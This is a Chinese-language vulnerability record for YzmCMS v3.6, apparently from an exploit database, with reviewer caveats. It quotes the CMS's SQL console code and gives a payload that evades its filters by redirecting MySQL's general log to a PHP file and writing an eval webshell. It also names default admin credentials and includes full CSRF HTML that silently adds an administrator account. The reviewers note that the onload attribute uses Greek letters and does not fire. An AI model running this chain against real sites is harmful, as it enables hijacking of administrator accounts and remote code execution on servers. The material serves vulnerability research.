---
source: "hatch 补库批 20260928"
product: "YzmCMS3.6"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "YzmCMS v3.6 csrf"
prerequisites: "来源所述条件，未列明部分仍待核：victimadminvisitsCSRFpage;SQLexecuteenabled; DBadmin/SUPERforgloballog,webwritepath/PHPexecution"
side_effects: "未执行；本文需注意的操作影响：CSRF 加管理员与后台 SQL 控制台日志写入是不同阶段：后者要求 sql_execute 配置门槛、数据库高权限、日志路径可写和 PHP 解析。SET GLOBAL 会改变实际日志目标，需记录并还原旧值；默认口令不代表所有安装。"
source_status: "unknown"
id: "vw-f461f120d0ca47bb00c193da"
entity_id: "ve-f461f120d0ca47bb00c193da"
schema_version: "1"
---

## 核对与使用边界

- 明确更正：HTML 中 `οnlοad` 使用希腊 omicron，不是 ASCII onload 事件名，不能按原样触发自动提交。原字符串保留在代码内。
- CSRF 加管理员与后台 SQL 控制台日志写入是不同阶段：后者要求 sql_execute 配置门槛、数据库高权限、日志路径可写和 PHP 解析。SET GLOBAL 会改变实际日志目标，需记录并还原旧值；默认口令不代表所有安装。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：victimadminvisitsCSRFpage;SQLexecuteenabled; DBadmin/SUPERforgloballog,webwritepath/PHPexecution

- **结论使用边界（1）**：HTML οnlοad含希腊omicron非onload，自动提交不会按预期触发。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **结论使用边界（2）**：文章混CSRF加管理员与后台SQL控制台日志RCE两原语，需分层而非单csrf漏洞。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **适用与权限边界（3）**：代码有sql_execute配置门槛未在利用前提列出，默认yzmcms口令非所有站点事实。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **操作与副作用边界（4）**：SET GLOBAL日志需高DB权限且会改变持久日志目标，缺恢复/权限说明；CONCAT表达式赋系统变量需按MySQL版本核。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

- **结论使用边界（5）**：代码混行号和oufile错字，CSRF目标为回环地址，需说明执行环境。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# YzmCMS v3.6 csrf

一、漏洞简介
------------

二、漏洞影响
------------

YzmCMS v3.6

三、复现过程
------------

1、文件位置: /application/admin/controller/sql.class.php第10-42行中：

    public function init() {  
        if(isset($_POST['sqlstr'])){  
            if(!C('sql_execute')) showmsg('根据系统配置，不允许在线执行SQL命令！', 'stop');  
            $sqlstr = MAGIC_QUOTES_GPC ? stripslashes($_POST['sqlstr']) : $_POST['sqlstr'];  
            $sqlstr = rtrim(trim($sqlstr), ';');  
            $sqls = $_POST['action']=='many' ? explode(';', $sqlstr) : array(0 => $sqlstr);  

            $admin = D('admin');  
            foreach($sqls as $sql){  
    10.             if(stristr($sql, 'outfile')){  
    11.                 $str = '<span class="c-red">ERROR : 检测到非法字符 “outfile”！</span>';  
    12.                 break;  
    13.             }  
    14.             if(stristr($sql, '.php')){  
    15.                 $str = '<span class="c-red">ERROR : 检测到非法字符 “.php” ！</span>';  
    16.                 break;  
    17.             }  
    18.             if(preg_match("/^drop(.*)database/i", $sql)){  
    19.                 $str = '<span class="c-red">ERROR : 不允许删除数据库！</span>';  
    20.                 break;  
    21.             }  
    22.             $result = $admin->query($sql);   
    23.             if($result){  
    24.                 $str = '<span style="color:green">OK : 执行成功！</span>';  
    25.                 if(is_object($result) || is_resource($result)){  
    26.                     $arr = $admin->fetch_all($result);  
    27.                 }                     
    28.             }else{  
    29.                 $str = '<span class="c-red">ERROR : 执行失败！</span>';  
    30.                 break;  
    31.             }                 
    32.         }  
    33.     }

这段函数中对提交的sql参数进行还原处理，然后进行非法字符检测，检测字符是否存在"oufile"、".php",匹配是否有删除数据的操作等。

2、如何绕过这种限制？

首页，outfile被禁止，第一时间想到的就是SQL语句利用日志写入文件，但是写入脚本文件".php"会被检测到非法字符；然后，尝试MySQL中concat函数来连接字符串，拆分'.php'关键词，如
CONCAT(\"test.\",\"php\");最后构造出可以写入文件，绕过非法字符检测的的SQL语句，从而触发代码执行漏洞，控制服务器。

Payload：

    show variables like '%general%';   #查看配置
    set global general_log = on;        #开启general log模式
    set global general_log_file =CONCAT("E:\\study\\WWW\\YzmCMS\\test.","php"); 
    select '<?php eval($_POST[cmd]);?>';   #写入shell

### 漏洞复现

#### 如何获取后台管理员权限

有两种思路：

思路A：通过默认信息，弱口令登录

默认后台路径：<http://www.0-sec.org/admin/index/login.html>

管理员默认账号密码均为：yzmcms

思路B：通过CSRF漏洞，诱导管理员访问，自动在后台添加管理员账号。

CSRF漏洞利用代码如下：

    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">  

    <html>  
    <head>  
    <title>OWASP CRSFTester Demonstration</title>  
    </head>  
    <body οnlοad="javascript:fireForms()">  
    <script language="JavaScript">  
    var pauses = new Array( "68" );  

     function pausecomp(millis)  

     {  

         var date = new Date();  
        var curDate = null;  

         do { curDate = new Date(); }  
         while(curDate-date < millis);  
     }  


     function fireForms()  

     {  

         var count = 1;  
         var i=0;  

         for(i=0; i<count; i++)  
         {  
             document.forms[i].submit();  

             pausecomp(pauses[i]);  
         }  
     }  


     </script>  

     <H2>OWASP CRSFTester Demonstration</H2>  

     <form method="POST" name="form0" action="http://127.0.0.1:80/admin/admin_manage/add.html">  

     <input type="hidden" name="adminname" value="admin"/>  

     <input type="hidden" name="password" value="abc123!"/>  

     <input type="hidden" name="password2" value="abc123!"/>  

     <input type="hidden" name="email" value=""/>  

     <input type="hidden" name="realname" value=""/>  

     <input type="hidden" name="roleid" value="1"/>  

     <input type="hidden" name="dosubmit" value="1"/>  

     </form>  

     </body>  

     </html>
